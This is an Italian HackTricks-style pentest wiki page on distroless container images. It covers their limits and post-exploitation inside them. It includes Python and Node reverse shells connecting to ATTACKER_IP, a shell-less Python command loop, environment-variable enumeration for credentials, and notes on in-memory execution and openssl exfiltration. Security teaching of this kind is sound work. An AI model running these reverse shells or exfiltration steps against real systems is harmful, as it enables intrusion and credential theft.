# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Un'immagine container **distroless** è un'immagine che contiene i **componenti runtime minimi necessari per eseguire una specifica applicazione**, rimuovendo intenzionalmente gli strumenti di distribuzione usuali come package manager, shell e ampie raccolte di utility userland generiche. In pratica, le immagini distroless spesso contengono solo il binario dell'applicazione o il runtime, le sue librerie condivise, i bundle di certificati e una struttura di filesystem molto ridotta.

Il punto non è che distroless sia una nuova primitiva di isolamento del kernel. Distroless è una **strategia di design dell'immagine**. Cambia ciò che è disponibile **all'interno** del filesystem del container, non il modo in cui il kernel isola il container. Questa distinzione è importante, perché distroless indurisce l'ambiente principalmente riducendo ciò che un attaccante può utilizzare dopo aver ottenuto l'esecuzione di codice. Non sostituisce namespaces, seccomp, capabilities, AppArmor, SELinux o qualsiasi altro meccanismo di isolamento runtime.

## Perché Distroless Esiste

Le immagini distroless vengono usate principalmente per ridurre:

- la dimensione dell'immagine
- la complessità operativa dell'immagine
- il numero di pacchetti e binari che potrebbero contenere vulnerabilità
- il numero di strumenti di post-exploitation disponibili per un attaccante di default

Per questo le immagini distroless sono popolari nelle deployment applicative in produzione. Un container che non contiene shell, package manager e quasi nessuno strumento generico è solitamente più facile da ragionare operativamente e più difficile da abusare in modo interattivo dopo una compromissione.

Esempi di famiglie di immagini in stile distroless ben note includono:

- Google's distroless images
- Chainguard hardened/minimal images

## Cosa Distroless Non Significa

Un container distroless **non** è:

- automaticamente rootless
- automaticamente non-privilegiato
- automaticamente read-only
- automaticamente protetto da seccomp, AppArmor o SELinux
- automaticamente sicuro da container escape

È ancora possibile eseguire un'immagine distroless con `--privileged`, con condivisione di namespace host, bind mount pericolosi o un socket runtime montato. In quello scenario, l'immagine può essere minimale, ma il container può comunque essere catastroficamente insicuro. Distroless cambia la superficie d'attacco userland, non il confine di fiducia del kernel.

## Caratteristiche Operative Tipiche

Quando comprometti un container distroless, la prima cosa che di solito noti è che assunzioni comuni smettono di essere vere. Potrebbe non esserci `sh`, non esserci `bash`, non esserci `ls`, non esserci `id`, non esserci `cat`, e a volte neanche un ambiente basato su libc che si comporti come si aspetta il tuo solito tradecraft. Questo influisce sia sull'offense che sulla defense, perché la mancanza di tooling rende debugging, incident response e post-exploitation diversi.

I pattern più comuni sono:

- il runtime dell'applicazione esiste, ma c'è poco altro
- i payload basati su shell falliscono perché non c'è una shell
- gli one-liner di enumerazione comuni falliscono perché i binari helper mancano
- protezioni sul filesystem come rootfs read-only o `noexec` su tmpfs scrivibili sono spesso presenti anch'esse

Questa combinazione è ciò che generalmente porta le persone a parlare di "weaponizing distroless".

## Distroless e Post-Exploitation

La principale sfida offensiva in un ambiente distroless non è sempre l'RCE iniziale. Spesso è ciò che segue. Se il workload sfruttato fornisce esecuzione di codice in un language runtime come Python, Node.js, Java o Go, potresti essere in grado di eseguire logica arbitraria, ma non attraverso i flussi di lavoro centrati sulla shell che sono comuni in altri target Linux.

Questo significa che il post-exploitation spesso si sposta in una di tre direzioni:

1. **Usare direttamente il language runtime esistente** per enumerare l'ambiente, aprire socket, leggere file o stage payload aggiuntivi.
2. **Portare il proprio tooling nella memoria** se il filesystem è read-only o le posizioni scrivibili sono montate `noexec`.
3. **Abusare di binari esistenti già presenti nell'immagine** se l'applicazione o le sue dipendenze includono qualcosa inaspettatamente utile.

## Abuse

### Enumerare il Runtime Che Hai Già

In molti container distroless non c'è una shell, ma è comunque presente un runtime dell'applicazione. Se il target è un servizio Python, Python è lì. Se il target è Node.js, Node è lì. Questo spesso fornisce funzionalità sufficienti per enumerare file, leggere variabili d'ambiente, aprire reverse shell e stage esecuzioni in-memory senza mai invocare `/bin/sh`.

Un semplice esempio con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un semplice esempio con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impatto:

- recupero delle variabili d'ambiente, spesso contenenti credenziali o endpoint dei servizi
- enumerazione del filesystem senza `/bin/ls`
- identificazione di percorsi scrivibili e secrets montati

### Reverse Shell senza `/bin/sh`

Se l'immagine non contiene `sh` o `bash`, una classica reverse shell basata sulla shell potrebbe fallire immediatamente. In tal caso, usa invece il runtime del linguaggio installato.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` non esiste, sostituisci l'ultima riga con l'esecuzione diretta di comandi tramite Python o con un loop REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Di nuovo, se `/bin/sh` è assente, usa direttamente le API di filesystem, process e networking di Node anziché avviare una shell.

### Esempio completo: loop di comandi Python senza shell

Se l'immagine contiene Python ma non ha affatto una shell, un semplice loop interattivo è spesso sufficiente per mantenere piena capacità di post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Questo non richiede un binario di shell interattiva. L'impatto è sostanzialmente lo stesso di una shell di base dal punto di vista dell'attaccante: esecuzione di comandi, enumerazione e staging di ulteriori payload tramite il runtime esistente.

### In-Memory Tool Execution

Le immagini Distroless sono spesso combinate con:

- `readOnlyRootFilesystem: true`
- tmpfs scrivibili ma `noexec` come `/dev/shm`
- una mancanza di package management tools

Questa combinazione rende inaffidabili i flussi di lavoro classici "download binary to disk and run it". In quei casi, le memory execution techniques diventano la risposta principale.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Le tecniche più rilevanti lì sono:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Alcune immagini distroless contengono ancora binari necessari al funzionamento che diventano utili dopo un compromise. Un esempio osservato ripetutamente è `openssl`, perché le applicazioni a volte lo richiedono per operazioni legate a crypto o TLS.

Un semplice pattern di ricerca è:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` è presente, potrebbe essere utile per:

- connessioni TLS in uscita
- data exfiltration attraverso un canale di uscita consentito
- staging payload data tramite blob codificati/criptati

L'abuso esatto dipende da ciò che è effettivamente installato, ma l'idea generale è che distroless non significa "assenza totale di strumenti"; significa "molto meno strumenti rispetto a un'immagine di una distribuzione normale".

## Checks

Lo scopo di questi controlli è determinare se l'immagine sia realmente distroless nella pratica e quali runtime o binari helper siano ancora disponibili per post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- Se non è disponibile una shell ma è presente un runtime come Python o Node, la post-exploitation dovrebbe spostarsi verso l'esecuzione guidata dal runtime.
- Se il root filesystem è in sola lettura e `/dev/shm` è scrivibile ma `noexec`, le tecniche di esecuzione in memoria diventano molto più rilevanti.
- Se sono presenti binari di supporto come `openssl`, `busybox` o `java`, potrebbero offrire funzionalità sufficienti per bootstrap di accesso aggiuntivo.

## Runtime Defaults

| Immagine / stile piattaforma | Stato predefinito | Comportamento tipico | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Google distroless style images | Userland minimale per progettazione | Nessuna shell, nessun package manager, solo dipendenze applicazione/runtime | aggiunta di layer di debug, sidecar shells, copia di busybox o tooling |
| Chainguard minimal images | Userland minimale per progettazione | Superficie dei pacchetti ridotta, spesso focalizzata su un runtime o servizio | uso di `:latest-dev` o varianti di debug, copia di tool durante la build |
| Kubernetes workloads using distroless images | Dipende dalla configurazione del Pod | Distroless influenza solo il userland; la postura di sicurezza del Pod dipende ancora dal Pod spec e dai default del runtime | aggiunta di container di debug effimeri, host mounts, impostazioni Pod privilegiato |
| Docker / Podman running distroless images | Dipende dai run flags | Filesystem minimale, ma la sicurezza a runtime dipende ancora dai flag e dalla configurazione del daemon | `--privileged`, condivisione namespace host, runtime socket mounts, writable host binds |

Il punto chiave è che distroless è una **proprietà dell'immagine**, non una protezione a runtime. Il suo valore deriva dal ridurre ciò che è disponibile all'interno del filesystem dopo una compromissione.

## Related Pages

Per bypass del filesystem e dell'esecuzione in memoria comunemente necessari negli ambienti distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Per abuso del container runtime, socket e mount che si applica ancora ai workload distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
